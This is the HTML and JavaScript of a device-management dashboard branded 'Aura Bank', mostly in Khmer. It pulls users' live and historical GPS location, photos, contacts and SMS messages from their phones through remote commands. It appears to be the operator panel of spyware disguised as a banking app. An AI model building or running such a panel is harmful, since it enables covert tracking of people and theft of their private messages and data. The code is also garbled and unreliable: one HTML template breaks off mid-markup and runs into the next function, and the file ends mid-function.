<!DOCTYPE html>
<html lang="km">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Aura Bank · គ្រប់គ្រងឧបករណ៍</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Khmer:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  
  body {
    font-family: 'Noto Sans Khmer', sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    padding: 20px;
    color: #333;
  }
  
  .container {
    max-width: 1400px;
    margin: 0 auto;
  }
  
  /* Header */
  .header {
    background: white;
    padding: 24px 32px;
    border-radius: 16px;
    margin-bottom: 24px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  
  .header h1 {
    font-size: 28px;
    font-weight: 700;
    color: #667eea;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  
  .header .meta {
    color: #666;
    font-size: 14px;
    padding: 8px 16px;
    background: #f0f4ff;
    border-radius: 8px;
  }
  
  /* Tabs */
  .tabs {
    display: flex;
    gap: 12px;
    margin-bottom: 24px;
    flex-wrap: wrap;
  }
  
  .tab-btn {
    padding: 14px 28px;
    border: none;
    background: white;
    border-radius: 12px;
    cursor: pointer;
    font-weight: 600;
    font-size: 15px;
    transition: all 0.3s;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    display: flex;
    align-items: center;
    gap: 8px;
  }
  
  .tab-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 16px rgba(0,0,0,0.15);
  }
  
  .tab-btn.active {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    box-shadow: 0 4px 16px rgba(102, 126, 234, 0.4);
  }
  
  /* Content */
  .tab-content {
    display: none;
    background: white;
    padding: 32px;
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    animation: fadeIn 0.3s;
  }
  
  .tab-content.active {
    display: block;
  }
  
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }
  
  /* Stats */
  .stats {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 16px;
    margin-bottom: 24px;
  }
  
  .stat-card {
    padding: 20px;
    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
    border-radius: 12px;
    text-align: center;
    transition: transform 0.2s;
  }
  
  .stat-card:hover {
    transform: scale(1.05);
  }
  
  .stat-value {
    font-size: 32px;
    font-weight: 700;
    color: #667eea;
    margin-bottom: 4px;
  }
  
  .stat-label {
    font-size: 13px;
    color: #666;
    font-weight: 500;
  }
  
  /* Search */
  .search-box {
    width: 100%;
    padding: 14px 20px;
    border: 2px solid #e0e0e0;
    border-radius: 12px;
    margin-bottom: 20px;
    font-size: 15px;
    font-family: inherit;
    transition: all 0.3s;
  }
  
  .search-box:focus {
    outline: none;
    border-color: #667eea;
    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
  }
  
  /* Table */
  .data-table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
    background: white;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
  }
  
  .data-table thead {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
  }
  
  .data-table th {
    padding: 16px;
    text-align: left;
    font-weight: 600;
    font-size: 14px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  
  .data-table td {
    padding: 16px;
    border-bottom: 1px solid #f0f0f0;
    font-size: 14px;
  }
  
  .data-table tr:last-child td {
    border-bottom: none;
  }
  
  .data-table tbody tr {
    transition: background 0.2s;
  }
  
  .data-table tbody tr:hover {
    background: #f9fafb;
  }
  
  /* SMS Cards */
  .sms-list {
    display: flex;
    flex-direction: column;
    gap: 16px;
  }
  
  .sms-card {
    padding: 20px;
    background: white;
    border: 2px solid #e0e0e0;
    border-radius: 12px;
    transition: all 0.3s;
  }
  
  .sms-card:hover {
    border-color: #667eea;
    box-shadow: 0 4px 16px rgba(102, 126, 234, 0.15);
    transform: translateY(-2px);
  }
  
  .sms-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
    padding-bottom: 12px;
    border-bottom: 1px solid #f0f0f0;
  }
  
  .sms-header strong {
    font-size: 16px;
    color: #333;
  }
  
  .sms-header small {
    color: #999;
    font-size: 13px;
  }
  
  .sms-meta {
    display: flex;
    gap: 8px;
    margin-bottom: 12px;
    flex-wrap: wrap;
  }
  
  .pill {
    padding: 4px 12px;
    border-radius: 16px;
    font-size: 12px;
    font-weight: 600;
    display: inline-flex;
    align-items: center;
    gap: 4px;
  }
  
  .pill.inbox {
    background: #dbeafe;
    color: #1e40af;
  }
  
  .pill.sent {
    background: #dcfce7;
    color: #166534;
  }
  
  .pill.read {
    background: #f3f4f6;
    color: #6b7280;
  }
  
  .pill.unread {
    background: #fef3c7;
    color: #92400e;
  }
  
  .sms-body {
    color: #555;
    line-height: 1.6;
    white-space: pre-wrap;
    margin-top: 8px;
    padding: 12px;
    background: #f9fafb;
    border-radius: 8px;
  }
  
  /* Empty State */
  .empty {
    text-align: center;
    padding: 60px 20px;
    color: #999;
  }
  
  .empty-icon {
    font-size: 64px;
    margin-bottom: 16px;
    opacity: 0.3;
  }
  
  .empty-text {
    font-size: 16px;
    line-height: 1.6;
  }
  
  /* Map Container */
  #map {
    width: 100%;
    height: 500px;
    border-radius: 12px;
    margin-bottom: 20px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    z-index: 1;
  }
  
  /* Map Toggle Button */
  .map-toggle {
    background: white;
    border: 2px solid #667eea;
    border-radius: 8px;
    padding: 8px 16px;
    cursor: pointer;
    font-weight: 600;
    font-size: 13px;
    color: #667eea;
    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    transition: all 0.3s;
    display: flex;
    align-items: center;
    gap: 6px;
    white-space: nowrap;
  }
  
  .map-toggle:hover {
    background: #667eea;
    color: white;
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
  }
  
  .map-toggle.active {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border-color: transparent;
  }
  
  .map-wrapper {
    position: relative;
  }
  
  /* Marker Animation */
  @keyframes markerBounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-20px); }
  }
  
  @keyframes markerPulse {
    0% {
      box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.7);
    }
    70% {
      box-shadow: 0 0 0 20px rgba(102, 126, 234, 0);
    }
    100% {
      box-shadow: 0 0 0 0 rgba(102, 126, 234, 0);
    }
  }
  
  .leaflet-marker-icon {
    animation: markerBounce 1s ease-in-out;
    transition: all 0.3s ease;
  }
  
  .leaflet-marker-icon:hover {
    transform: scale(1.2);
  }
  
  .pulse-marker {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #667eea;
    border: 3px solid white;
    box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.7);
    animation: markerPulse 2s infinite;
  }
  
  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
  
  /* Location Details */
  .location-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 16px;
    margin-top: 20px;
  }
  
  .location-item {
    padding: 20px;
    background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 100%);
    border-radius: 12px;
    border-left: 4px solid #667eea;
  }
  
  .location-label {
    font-size: 12px;
    color: #666;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 8px;
    font-weight: 600;
  }
  
  .location-value {
    font-size: 18px;
    font-weight: 600;
    color: #333;
  }
  
  /* Live tracking indicator */
  .live-indicator {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 6px 14px;
    background: linear-gradient(135deg, #10b981 0%, #059669 100%);
    color: white;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 600;
    animation: livePulse 2s infinite;
  }

  .live-indicator.off {
    background: #6b7280;
    animation: none;
  }

  @keyframes livePulse {
    0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.5); }
    50% { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
  }

  /* Location history timeline */
  .timeline {
    position: relative;
    padding-left: 32px;
    margin-top: 24px;
  }

  .timeline::before {
    content: '';
    position: absolute;
    left: 11px;
    top: 0;
    bottom: 0;
    width: 3px;
    background: linear-gradient(to bottom, #667eea, #764ba2);
    border-radius: 2px;
  }

  .timeline-item {
    position: relative;
    padding: 16px 20px;
    margin-bottom: 16px;
    background: linear-gradient(135deg, #f8f9ff 0%, #f0f4ff 100%);
    border-radius: 12px;
    border: 1px solid rgba(102, 126, 234, 0.15);
    transition: all 0.3s;
    cursor: pointer;
  }

  .timeline-item:hover {
    transform: translateX(4px);
    border-color: #667eea;
    box-shadow: 0 4px 16px rgba(102, 126, 234, 0.15);
  }

  .timeline-item::before {
    content: '';
    position: absolute;
    left: -27px;
    top: 20px;
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: #667eea;
    border: 3px solid white;
    box-shadow: 0 2px 6px rgba(102, 126, 234, 0.4);
  }

  .timeline-item.latest::before {
    background: #10b981;
    box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.2);
    animation: markerPulse 2s infinite;
  }

  .timeline-time {
    font-size: 12px;
    color: #667eea;
    font-weight: 600;
    margin-bottom: 6px;
  }

  .timeline-address {
    font-size: 15px;
    color: #333;
    font-weight: 500;
    margin-bottom: 4px;
  }

  .timeline-coords {
    font-size: 12px;
    color: #999;
    font-family: monospace;
  }

  .timeline-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 24px;
    margin-bottom: 16px;
  }

  .timeline-header h3 {
    color: #333;
    font-size: 18px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .timeline-count {
    padding: 4px 12px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border-radius: 16px;
    font-size: 12px;
    font-weight: 600;
  }

  /* Responsive */
  @media (max-width: 768px) {
    body { padding: 12px; }
    .header { flex-direction: column; gap: 12px; padding: 20px; }
    .header h1 { font-size: 22px; }
    .tab-content { padding: 20px; }
    .stats { grid-template-columns: repeat(2, 1fr); }
    .data-table { font-size: 13px; }
    .data-table th, .data-table td { padding: 12px 8px; }
  }
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <h1>📱 គ្រប់គ្រងឧបករណ៍</h1>
    <div class="meta" id="pageMeta">កំពុងផ្ទុក...</div>
  </div>

  <div class="tabs">
    <button class="tab-btn" data-tab="location">📍 ទីតាំង</button>
    <button class="tab-btn" data-tab="photos">🖼️ Photos</button>
    <button class="tab-btn" data-tab="contacts">👥 Contacts</button>
    <button class="tab-btn" data-tab="sms">💬 SMS</button>
  </div>

  <div id="location-tab" class="tab-content">
    <div class="map-wrapper">
      <div id="map"></div>
      <div style="position:absolute;top:20px;right:20px;z-index:1000;display:flex;flex-direction:column;gap:8px;">
        <button id="mapToggle" class="map-toggle" style="position:static;" onclick="toggleMapView()">
          <span id="toggleIcon">🛰️</span>
          <span id="toggleText">Satellite</span>
        </button>
        <button id="refreshLocation" class="map-toggle" style="position:static;" onclick="refreshLocation()">
          <span>🔄</span>
          <span>ផ្ទុកឡើងវិញ</span>
        </button>
        <button id="liveTrackBtn" class="map-toggle" style="position:static;" onclick="toggleLiveTracking()">
          <span>📡</span>
          <span id="liveTrackText">Live Tracking</span>
        </button>
        <button id="openGoogleMaps" class="map-toggle" style="position:static;background:#4285F4;color:white;border-color:#4285F4;" onclick="openInGoogleMaps()">
          <span>🗺️</span>
          <span>Google Maps</span>
        </button>
      </div>
    </div>
    <div class="stats" id="locationStats"></div>
    <div id="locationContent"></div>
  </div>

  <div id="photos-tab" class="tab-content">
    <div class="stats" id="photosStats"></div>
    <div id="photosContent"></div>
  </div>

  <div id="contacts-tab" class="tab-content">
    <input type="search" class="search-box" id="contactSearch" placeholder="🔍 ស្វែងរក contact តាមឈ្មោះ លេខទូរស័ព្ទ ឬ email...">
    <div class="stats" id="contactStats"></div>
    <div id="contactsContent"></div>
  </div>

  <div id="sms-tab" class="tab-content">
    <input type="search" class="search-box" id="smsSearch" placeholder="🔍 ស្វែងរក SMS តាមលេខទូរស័ព្ទ ឬ nội dung...">
    <div class="stats" id="smsStats"></div>
    <div id="smsContent"></div>
  </div>
</div>

<script>
const API = '/admin/api';
const params = new URLSearchParams(window.location.search);
let token = params.get('token');
let userId = params.get('user_id');
let targetTab = params.get('tab') || 'location'; // Default to location tab
let commandData = {};
let allPhotos = []; // Accumulated photos from all pagination commands
let photosOffset = 0; // Current offset for next page
const photosPerPage = 20;
let isLoadingMore = false;
let map = null;
let standardLayer = null;
let satelliteLayer = null;
let isSatelliteView = false;
let locationHistory = []; // From device_locations table
let historyMarkers = [];
let historyPolyline = null;
let latestMarker = null;
let liveTrackingInterval = null;
let isLiveTracking = false;

if (!userId || !token) {
  alert('❌ ខ្វះ user ID ឬ token');
  window.close();
}

// Check role from JWT token
function decodeJWT(token) {
  try {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
    return JSON.parse(jsonPayload);
  } catch (e) {
    return null;
  }
}

const decoded = decodeJWT(token);
if (!decoded || decoded.role !== 'management') {
  alert('❌ មិនមានសិទ្ធិចូលដំណើរការផ្នែកគ្រប់គ្រងទូរស័ព្ទ\nសិទ្ធិនេះមានតែសម្រាប់ថ្នាក់ដឹកនាំ/នាយកប្រតិបត្តិប៉ុណ្ណោះ');
  window.close();
}

async function api(path, opts = {}) {
  const res = await fetch(API + path, {
    ...opts,
    headers: {
      ...(opts.body ? { 'Content-Type': 'application/json' } : {}),
      'Authorization': 'Bearer ' + token,
    },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  });
  let json = null;
  try { json = await res.json(); } catch (_) {}
  if (!res.ok) {
    if (res.status === 401) {
      alert('Session expired. សូមបិទ window នេះហើយព្យាយាមម្តងទៀត។');
      window.close();
    }
    throw new Error(json?.error || `HTTP ${res.status}`);
  }
  return json?.data;
}

function esc(s) {
  if (s == null) return '';
  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

function dt(d) {
  if (!d) return '—';
  // Android DATE_ADDED is in seconds, JS Date expects milliseconds
  const timestamp = d > 10000000000 ? d : d * 1000;
  return new Date(timestamp).toLocaleString('km-KH', { 
    year: 'numeric', 
    month: 'short', 
    day: 'numeric', 
    hour: '2-digit', 
    minute: '2-digit' 
  });
}

function showModal(title, content) {
  const modal = document.createElement('div');
  modal.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;';
  
  const modalContent = document.createElement('div');
  modalContent.style.cssText = 'background: white; border-radius: 16px; max-width: 800px; width: 100%; max-height: 90vh; overflow-y: auto; padding: 32px; position: relative;';
  
  const header = document.createElement('div');
  header.style.cssText = 'display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 2px solid #f0f0f0;';
  
  const titleEl = document.createElement('h2');
  titleEl.textContent = title;
  titleEl.style.cssText = 'margin: 0; color: #667eea; font-size: 24px;';
  
  const closeBtn = document.createElement('button');
  closeBtn.textContent = '✕';
  closeBtn.style.cssText = 'background: none; border: none; font-size: 28px; cursor: pointer; color: #999; padding: 0; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: all 0.3s;';
  closeBtn.onmouseover = () => { closeBtn.style.background = '#f0f0f0'; closeBtn.style.color = '#333'; };
  closeBtn.onmouseout = () => { closeBtn.style.background = 'none'; closeBtn.style.color = '#999'; };
  closeBtn.onclick = () => document.body.removeChild(modal);
  
  header.appendChild(titleEl);
  header.appendChild(closeBtn);
  
  const body = document.createElement('div');
  body.innerHTML = content;
  
  modalContent.appendChild(header);
  modalContent.appendChild(body);
  modal.appendChild(modalContent);
  
  modal.onclick = (e) => { if (e.target === modal) document.body.removeChild(modal); };
  document.body.appendChild(modal);
}

// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(btn.dataset.tab + '-tab').classList.add('active');
  };
});

// Load data
async function loadData() {
  try {
    const [commands, locationHistoryData] = await Promise.all([
      api(`/device/commands?user_id=${userId}&limit=200`),
      api(`/device/locations?user_id=${userId}&limit=100`).catch(() => []),
    ]);

    locationHistory = Array.isArray(locationHistoryData) ? locationHistoryData : [];

    const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);

    // Accumulate photos from ALL get_photos commands (for pagination)
    const photosCmds = commands
      .filter(c => c.command_type === 'get_photos' && c.result_data)
      .sort((a, b) => new Date(a.created_at) - new Date(b.created_at));

    allPhotos = [];
    const seenIds = new Set();
    for (const cmd of photosCmds) {
      const photos = cmd.result_data?.photos || [];
      for (const p of photos) {
        if (!seenIds.has(p.id)) {
          seenIds.add(p.id);
          allPhotos.push(p);
        }
      }
    }
    photosOffset = allPhotos.length;

    commandData = {
      location: locationCmd?.result_data,
      photos: allPhotos.length > 0 ? { photos: allPhotos, count: allPhotos.length } : null,
      contacts: commands.find(c => c.command_type === 'get_contacts' && c.result_data)?.result_data,
      sms: commands.find(c => c.command_type === 'get_sms' && c.result_data)?.result_data,
    };

    document.getElementById('pageMeta').textContent = `User ID: ${userId}`;

    // Render each tab with its own error handling
    try {
      renderLocation();
    } catch (err) {
      console.error('renderLocation error:', err);
    }

    try {
      renderPhotos();
    } catch (err) {
      console.error('renderPhotos error:', err);
    }

    try {
      renderContacts();
    } catch (err) {
      console.error('renderContacts error:', err);
    }

    try {
      renderSMS();
    } catch (err) {
      console.error('renderSMS error:', err);
    }

    // Activate the target tab
    activateTab(targetTab);

  } catch (error) {
    console.error('Load error:', error);
    alert('❌ មិនអាចផ្ទុកទិន្នន័យ: ' + error.message);
  }
}

function activateTab(tabName) {
  const tabBtn = document.querySelector(`.tab-btn[data-tab="${tabName}"]`);
  if (tabBtn) {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    tabBtn.classList.add('active');
    document.getElementById(tabName + '-tab').classList.add('active');
  }
}

function renderLocation() {
  const data = commandData.location;
  const mapContainer = document.getElementById('map');
  if (!mapContainer) {
    console.error('Map container not found');
    return;
  }

  // Initialize map
  try {
    map = L.map('map').setView([11.5564, 104.9282], 13);
  } catch (err) {
    console.error('Map initialization error:', err);
    return;
  }

  standardLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap contributors',
    maxZoom: 19,
  });

  satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
    attribution: 'Tiles © Esri',
    maxZoom: 19,
  });

  standardLayer.addTo(map);

  // Determine the latest location — prefer history table, fallback to command result
  let latest = null;
  if (locationHistory.length > 0) {
    const sorted = [...locationHistory].sort((a, b) => new Date(b.recorded_at) - new Date(a.recorded_at));
    latest = sorted[0];
  } else if (data && data.lat && data.lng) {
    latest = { lat: data.lat, lng: data.lng, accuracy: data.accuracy, address: data.address, recorded_at: data.recorded_at || new Date().toISOString() };
  }

  // Clear previous markers/polylines
  historyMarkers.forEach(m => map.removeLayer(m));
  historyMarkers = [];
  if (historyPolyline) { map.removeLayer(historyPolyline); historyPolyline = null; }
  if (latestMarker) { map.removeLayer(latestMarker); latestMarker = null; }

  if (!latest) {
    document.getElementById('locationStats').innerHTML = '';
    document.getElementById('locationContent').innerHTML = `
      <div class="empty">
        <div class="empty-icon">📍</div>
        <div class="empty-text">មិនមានទិន្នន័យទីតាំង<br>សូមចុច 📍 Location ក្នុង admin panel ដើម្បីទាញយក</div>
      </div>
    `;
    return;
  }

  const lat = parseFloat(latest.lat);
  const lng = parseFloat(latest.lng);
  const hasValidCoords = !isNaN(lat) && !isNaN(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180;

  // Draw history path first (so markers render on top)
  if (locationHistory.length > 1) {
    const pathPoints = locationHistory
      .filter(p => p.lat && p.lng)
      .sort((a, b) => new Date(a.recorded_at) - new Date(b.recorded_at))
      .map(p => [parseFloat(p.lat), parseFloat(p.lng)]);

    if (pathPoints.length > 1) {
      historyPolyline = L.polyline(pathPoints, {
        color: '#667eea',
        weight: 3,
        opacity: 0.6,
        dashArray: '8, 8',
        lineCap: 'round',
      }).addTo(map);
    }

    // History markers (smaller, semi-transparent)
    const historyPoints = locationHistory
      .filter(p => p.lat && p.lng)
      .sort((a, b) => new Date(b.recorded_at) - new Date(a.recorded_at));

    historyPoints.slice(1).forEach((p, idx) => {
      const pLat = parseFloat(p.lat);
      const pLng = parseFloat(p.lng);
      const age = Math.min(idx / historyPoints.length, 0.8);
      const historyIcon = L.divIcon({
        className: '',
        html: `<div style="width:10px;height:10px;border-radius:50%;background:rgba(118,75,162,${1 - age});border:2px solid white;box-shadow:0 1px 4px rgba(0,0,0,0.3);"></div>`,
        iconSize: [10, 10],
        iconAnchor: [5, 5],
      });
      const marker = L.marker([pLat, pLng], { icon: historyIcon }).addTo(map);
      const time = new Date(p.recorded_at).toLocaleString('km-KH');
      marker.bindPopup(`<div style="font-family:'Noto Sans Khmer',sans-serif;font-size:12px;"><strong>🕐 ${time}</strong><br>Lat: ${pLat.toFixed(6)} | Lng: ${pLng.toFixed(6)}</div>`);
      historyMarkers.push(marker);
    });
  }

  // Latest marker with pulse animation
  if (hasValidCoords) {
    const pulseIcon = L.divIcon({
      className: 'pulse-marker-wrapper',
      html: '<div class="pulse-marker"></div>',
      iconSize: [20, 20],
      iconAnchor: [10, 10],
    });

    latestMarker = L.marker([lat, lng], { icon: pulseIcon }).addTo(map);

    const loc = latest;
    const addressParts = [loc.address, data?.village, data?.commune, data?.district, data?.province, data?.country].filter(Boolean);
    const popupContent = `
      <div style="font-family:'Noto Sans Khmer',sans-serif;min-width:220px">
        <strong style="color:#667eea;font-size:14px">📍 ទីតាំងបច្ចុប្បន្ន</strong>
        <div style="margin-top:4px;font-size:11px;color:#10b981;font-weight:600;">● LIVE</div>
        <div style="margin-top:8px;font-size:12px;line-height:1.6">
          ${addressParts.length > 0 ? `<div style="margin-bottom:6px;">${addressParts.join(', ')}</div>` : ''}
          ${data?.village ? `<div>ភូមិ: <strong>${esc(data.village)}</strong></div>` : ''}
          ${data?.commune ? `<div>ឃុំ/សង្កាត់: <strong>${esc(data.commune)}</strong></div>` : ''}
          ${data?.district ? `<div>ស្រុក/ខណ្ឌ: <strong>${esc(data.district)}</strong></div>` : ''}
          ${data?.province ? `<div>ខេត្ត/ក្រុង: <strong>${esc(data.province)}</strong></div>` : ''}
          ${data?.country ? `<div>ប្រទេស: <strong>${esc(data.country)}</strong></div>` : ''}
          <div style="margin-top:8px;color:#666;font-size:11px;border-top:1px solid #eee;padding-top:6px;">
            Lat: ${lat.toFixed(6)} | Lng: ${lng.toFixed(6)}<br>
            Accuracy: ${loc.accuracy || data?.accuracy || '—'}m<br>
            ថ្មីបំផុត: ${new Date(loc.recorded_at).toLocaleString('km-KH')}
          </div>
        </div>
      </div>
    `;
    latestMarker.bindPopup(popupContent).openPopup();

    setTimeout(() => {
      try {
        map.invalidateSize();
        if (locationHistory.length > 1) {
          const allPoints = locationHistory.filter(p => p.lat && p.lng).map(p => [parseFloat(p.lat), parseFloat(p.lng)]);
          if (allPoints.length > 0) {
            map.fitBounds(allPoints, { padding: [50, 50], maxZoom: 16 });
          }
        } else {
          map.flyTo([lat, lng], 16, { duration: 1.5, easeLinearity: 0.5 });
        }
      } catch (err) {
        console.error('map animation error:', err);
      }
    }, 200);
  }

  // Stats
  const totalRecords = locationHistory.length || (data ? 1 : 0);
  const lastUpdate = latest.recorded_at ? new Date(latest.recorded_at).toLocaleString('km-KH') : '—';
  const timeSpan = locationHistory.length > 1
    ? getTimeSpan(locationHistory)
    : '—';

  document.getElementById('locationStats').innerHTML = `
    <div class="stat-card">
      <div class="stat-value">${hasValidCoords ? lat.toFixed(4) : '—'}</div>
      <div class="stat-label">🌍 Latitude</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${hasValidCoords ? lng.toFixed(4) : '—'}</div>
      <div class="stat-label">🌍 Longitude</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${latest.accuracy || data?.accuracy || '—'}m</div>
      <div class="stat-label">🎯 Accuracy</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${totalRecords}</div>
      <div class="stat-label">📊 ចំនួនកំណត់ត្រា</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="font-size:16px;">${timeSpan}</div>
      <div class="stat-label">⏱️ រយៈពេលតាមដាន</div>
    </div>
  `;

  // Location details + history timeline
  const historyHtml = locationHistory.length > 0 ? renderHistoryTimeline() : '';

  document.getElementById('locationContent').innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
      <h3 style="color:#333;font-size:18px;display:flex;align-items:center;gap:8px;">
        📍 ព័ត៌មានទីតាំង
        <span class="live-indicator ${isLiveTracking ? '' : 'off'}">
          <span style="width:8px;height:8px;border-radius:50%;background:${isLiveTracking ? '#fff' : '#999'};display:inline-block;"></span>
          ${isLiveTracking ? 'LIVE' : 'OFFLINE'}
        </span>
      </h3>
      <div style="font-size:13px;color:#666;">ធ្វើបច្ចុប្បន្នភាព: ${lastUpdate}</div>
    </div>
    <div class="location-grid">
      <div class="location-item">
        <div class="location-label">អាសយដ្ឋាន</div>
        <div class="location-value">${esc(data?.address || latest.address || '—')}</div>
      </div>
      <div class="location-item">
        <div class="location-label">ភូមិ</div>
        <div class="location-value">${esc(data?.village || '—')}</div>
      </div>
      <div class="location-item">
        <div class="location-label">ឃុំ/សង្កាត់</div>
        <div class="location-value">${esc(data?.commune || '—')}</div>
      </div>
      <div class="location-item">
        <div class="location-label">ស្រុក/ខណ្ឌ</div>
        <div class="location-value">${esc(data?.district || '—')}</div>
      </div>
      <div class="location-item">
        <div class="location-label">ខេត្ត/ក្រុង</div>
        <div class="location-value">${esc(data?.province || '—')}</div>
      </div>
      <div class="location-item">
        <div class="location-label">ប្រទេស</div>

}

function getTimeSpan(history) {
  if (history.length < 2) return '—';
  const sorted = [...history].sort((a, b) => new Date(a.recorded_at) - new Date(b.recorded_at));
  const first = new Date(sorted[0].recorded_at);
  const last = new Date(sorted[sorted.length - 1].recorded_at);
  const diffMs = last - first;
  const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
  const diffDays = Math.floor(diffHours / 24);
  if (diffDays > 0) return `${diffDays} ថ្ងៃ ${diffHours % 24} ម៉ោង`;
  if (diffHours > 0) return `${diffHours} ម៉ោង ${Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60))} នាទី`;
  return `${Math.floor(diffMs / (1000 * 60))} នាទី`;
}

function renderHistoryTimeline() {
  const sorted = [...locationHistory].sort((a, b) => new Date(b.recorded_at) - new Date(a.recorded_at));
  const display = sorted.slice(0, 20);

  return `
    <div class="timeline-header">
      <h3>🕐 ប្រវត្តិទីតាំង</h3>
      <span class="timeline-count">${sorted.length} កំណត់ត្រា</span>
    </div>
    <div class="timeline">
      ${display.map((p, idx) => {
        const time = new Date(p.recorded_at).toLocaleString('km-KH', {
          year: 'numeric', month: 'short', day: 'numeric',
          hour: '2-digit', minute: '2-digit',
        });
        return `
          <div class="timeline-item ${idx === 0 ? 'latest' : ''}" onclick="flyToHistoryPoint(${p.lat}, ${p.lng})">
            <div class="timeline-time">${time}${idx === 0 ? ' · បច្ចុប្បន្ន' : ''}</div>
            <div class="timeline-address">${esc(p.address || `Lat: ${parseFloat(p.lat).toFixed(5)}, Lng: ${parseFloat(p.lng).toFixed(5)}`)}</div>
            <div class="timeline-coords">🎯 ${p.accuracy || '—'}m · ${parseFloat(p.lat).toFixed(6)}, ${parseFloat(p.lng).toFixed(6)}</div>
          </div>
        `;
      }).join('')}
    </div>
  `;
}

function flyToHistoryPoint(lat, lng) {
  if (!map) return;
  map.flyTo([parseFloat(lat), parseFloat(lng)], 17, { duration: 1.0 });
}

async function toggleLiveTracking() {
  const btn = document.getElementById('liveTrackBtn');
  const textEl = document.getElementById('liveTrackText');

  if (isLiveTracking) {
    clearInterval(liveTrackingInterval);
    liveTrackingInterval = null;
    isLiveTracking = false;
    btn.classList.remove('active');
    textEl.textContent = 'Live Tracking';
    renderLocation();
  } else {
    isLiveTracking = true;
    btn.classList.add('active');
    textEl.textContent = 'កំពុងតាមដាន...';
    renderLocation();

    liveTrackingInterval = setInterval(async () => {
      try {
        const [newHistory, commands] = await Promise.all([
          api(`/device/locations?user_id=${userId}&limit=100`).catch(() => []),
          api(`/device/commands?user_id=${userId}&limit=5`),
        ]);
